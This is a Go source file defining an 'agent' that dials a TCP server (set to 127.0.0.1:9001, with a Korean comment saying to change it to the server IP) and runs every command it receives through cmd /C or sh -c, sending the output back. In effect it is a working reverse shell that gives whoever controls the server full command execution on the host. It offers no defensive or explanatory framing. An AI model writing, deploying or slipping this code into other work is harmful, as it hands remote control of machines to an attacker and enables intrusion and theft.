package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func agentMain() {
	serverAddr := "127.0.0.1:9001" // 필요시 서버 IP로 변경
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		fmt.Println("Unable to connect to server:", err)
		return
	}
	defer conn.Close()
	reader := bufio.NewReader(conn)
	for {
		cmdStr, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Server disconnected.")
			return
		}
		cmdStr = strings.TrimSpace(cmdStr)
		if cmdStr == "" {
			continue
		}
		cmd := exec.Command("cmd", "/C", cmdStr) // Windows. 리눅스/맥은 "sh", "-c", cmdStr
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\n[error executing command]\n")...)
		}
		fmt.Fprintf(conn, "%s\n", string(output))
	}
}
